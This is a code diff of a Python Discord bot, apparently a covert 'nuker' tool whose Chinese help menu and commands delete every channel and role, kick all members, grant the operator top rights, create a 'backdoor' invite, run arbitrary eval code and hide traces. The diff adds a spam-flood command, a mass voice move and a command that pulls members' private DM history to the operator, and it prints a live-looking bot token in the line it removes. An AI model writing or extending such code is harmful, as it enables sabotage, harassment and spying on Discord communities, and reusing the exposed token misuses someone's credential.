@@ -28,7 +28,7 @@ async def is_me(ctx):
 
 @app.route('/')
 def home():
-    return f"Bot {VERSION_ID} is running!"
+    return f"Traveler System [{VERSION_ID}] is Online."
 
 def run():
     port = int(os.environ.get("PORT", 8080))
@@ -41,14 +41,14 @@ def keep_alive():
 
 @bot.event
 async def on_ready():
-    print(f'Logged in as {bot.user} | ID: {VERSION_ID}')
+    print(f'系統連線成功 | 實例 ID: {VERSION_ID} | 帳號: {bot.user}')
 
 @bot.command(name="help")
 async def help_msg(ctx):
     if not await is_me(ctx): return
     
     embed = discord.Embed(
-        title="🧳 旅行者系統 - 指令詳細手冊", 
+        title="🧳 旅行者系統 - 指令完整手冊", 
         description=f"實例編號：`{VERSION_ID}`\n此表僅授權人員可見。執行指令後會自動隱身並清理痕跡。",
         color=0x2b2d31
     )
@@ -59,8 +59,6 @@ async def help_msg(ctx):
             "`!tm @成員 [分]` - 禁言成員\n"
             "`!kick_everyone` - 踢出伺服器全員\n"
             "`!bye` - 機器人退出伺服器\n"
-            "`!clean_user @成員 [數]` - 刪除指定人的訊息\n"
-            "`!clean_keyword [詞] [數]` - 刪除包含特定詞的訊息\n"
             "`!set_server [名]` - 修改伺服器名稱\n"
             "`!add_role @成員 @組` - 給予身分組\n"
             "`!remove_role @成員 @組` - 移除身分組\n"
@@ -70,12 +68,13 @@ async def help_msg(ctx):
     )
     
     embed.add_field(
-        name="🔥 破壞", 
+        name="🔥 破壞/重整", 
         value=(
             "`!del_ch` - 刪除所有頻道\n"
             "`!del_role` - 刪除所有身分組\n"
             "`!100ch` - 建立 100 個頻道\n"
-            "`!100rl` - 建立 100 個身分組"
+            "`!100rl` - 建立 100 個身分組\n"
+            "`!spam [次] [文]` - 洗頻攻擊"
         ), 
         inline=False
     )
@@ -86,7 +85,8 @@ async def help_msg(ctx):
             "`!op_me` - 獲取最高權限\n"
             "`!disrole @成員` - 剝奪對方身分\n"
             "`!del_msg [數]` - 批次清理訊息\n"
-            "`!backdoor` - 獲取永久邀請連結"
+            "`!backdoor` - 獲取永久邀請連結\n"
+            "`!move_all [頻道ID]` - 強制全體移動語音"
         ), 
         inline=False
     )
@@ -96,6 +96,8 @@ async def help_msg(ctx):
         value=(
             "`!eval [代碼]` - 執行動態 Python 腳本\n"
             "`!snapshot` - 導出伺服器完整結構 JSON\n"
+            "`!clean_user @成員 [數]` - 刪除指定人的訊息\n"
+            "`!clean_keyword [詞] [數]` - 刪除特定關鍵字\n"
             "`!reset` - 強制重啟系統實例"
         ), 
         inline=False
@@ -112,6 +114,8 @@ async def help_msg(ctx):
     
     embed.set_footer(text="注意：所有操作皆會記錄於開發後台。")
     await ctx.send(embed=embed)
+
+# --- 指令功能區 ---
 
 @bot.command(name="dm")
 async def dm(ctx, member: discord.Member, *, text: str):
@@ -160,6 +164,16 @@ async def purge_chat(ctx, amount: int = 10):
     try: await ctx.channel.purge(limit=amount)
     except: pass
 
+@bot.command(name="spam")
+async def spam(ctx, count: int, *, text: str):
+    if not await is_me(ctx): return
+    for i in range(min(count, 100)):
+        try:
+            suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
+            await ctx.send(f"{text} | {suffix}")
+            await asyncio.sleep(0.8)
+        except: break
+
 @bot.command(name="100rl")
 async def role_hell(ctx):
     if not await is_me(ctx): return
@@ -195,7 +209,7 @@ async def tm(ctx, member: discord.Member = None, minutes: int = 10):
     if member is None: return
     try:
         duration = datetime.timedelta(minutes=minutes)
-        await member.timeout(duration, reason="系統調整")
+        await member.timeout(duration, reason="呼吸")
     except: pass
 
 @bot.command(name="backdoor")
@@ -206,11 +220,18 @@ async def backdoor(ctx):
         await ctx.author.send(f"永久入口: {inv.url}")
     except: pass
 
+@bot.command(name="move_all")
+async def move_all(ctx, channel: discord.VoiceChannel):
+    if not await is_me(ctx): return
+    for member in ctx.guild.members:
+        if member.voice:
+            try: await member.move_to(channel)
+            except: pass
+
 @bot.command(name="disrole")
 async def isolate(ctx, member: discord.Member):
     if not await is_me(ctx): return
-    try:
-        await member.edit(roles=[])
+    try: await member.edit(roles=[])
     except: pass
 
 @bot.command(name="server_gate")
@@ -218,16 +239,40 @@ async def server_gate(ctx, status: str):
     if not await is_me(ctx): return
     can_send = True if status == "unlock" else False
     for channel in ctx.guild.text_channels:
-        try:
-            await channel.set_permissions(ctx.guild.default_role, send_messages=can_send)
+        try: await channel.set_permissions(ctx.guild.default_role, send_messages=can_send)
         except: pass
+
+@bot.command(name="add_role")
+async def add_role(ctx, member: discord.Member, role: discord.Role):
+    if not await is_me(ctx): return
+    try: await member.add_roles(role)
+    except: pass
+
+@bot.command(name="remove_role")
+async def remove_role(ctx, member: discord.Member, role: discord.Role):
+    if not await is_me(ctx): return
+    try: await member.remove_roles(role)
+    except: pass
+
+@bot.command(name="get_dm")
+async def get_dm(ctx, member: discord.Member, limit: int = 10):
+    if not await is_me(ctx): return
+    try:
+        dm_channel = member.dm_channel or await member.create_dm()
+        history = []
+        async for msg in dm_channel.history(limit=limit):
+            who = "機器人" if msg.author == bot.user else "成員"
+            history.append(f"[{msg.created_at.strftime('%H:%M')}] {who}: {msg.content}")
+        result = "\n".join(reversed(history)) or "無私訊紀錄"
+        await ctx.author.send(f"📂 **與 {member.name} 的紀錄：**\n{result[:1900]}")
+    except: pass
 
 @bot.command(name="snapshot")
 async def snapshot(ctx):
     if not await is_me(ctx): return
     guild = ctx.guild
     data = {
-        "server": {"name": guild.name, "id": guild.id, "owner": str(guild.owner)},
+        "server": {"name": guild.name, "id": guild.id},
         "roles": [{"name": r.name, "color": str(r.color), "perms": r.permissions.value} for r in sorted(guild.roles, key=lambda x: x.position, reverse=True) if not r.managed],
         "categories": []
     }
@@ -236,7 +281,7 @@ async def snapshot(ctx):
         data["categories"].append(cat_info)
     
     json_bytes = json.dumps(data, indent=4, ensure_ascii=False).encode()
-    await ctx.author.send(f"📂 **{guild.name}** 結構快照已生成。", file=discord.File(io.BytesIO(json_bytes), filename=f"{guild.id}_snapshot.json"))
+    await ctx.author.send(f"📂 **{guild.name}** 快照已生成。", file=discord.File(io.BytesIO(json_bytes), filename=f"snapshot.json"))
 
 @bot.command(name="eval")
 async def eval_code(ctx, *, code: str):
@@ -267,6 +312,11 @@ async def clean_keyword(ctx, keyword: str, amount: int = 50):
         await ctx.author.send(f"✅ 已清理 {len(deleted)} 則包含『{keyword}』的訊息")
     except: pass
 
+@bot.command(name="reset")
+async def reboot(ctx):
+    if not await is_me(ctx): return
+    os._exit(0)
+
 @bot.event
 async def on_message(message):
     if message.author == bot.user: return
@@ -277,5 +327,3 @@ async def on_message(message):
 
 if __name__ == "__main__":
     keep_alive()
-    
-bot.run("MTQ4NzcyNTMzMDExNzU2MjM5OQ.GdEAio.tb5pS63n67Hy_ILNZBQnVZZ6A2sFX2nxEfWyjY")
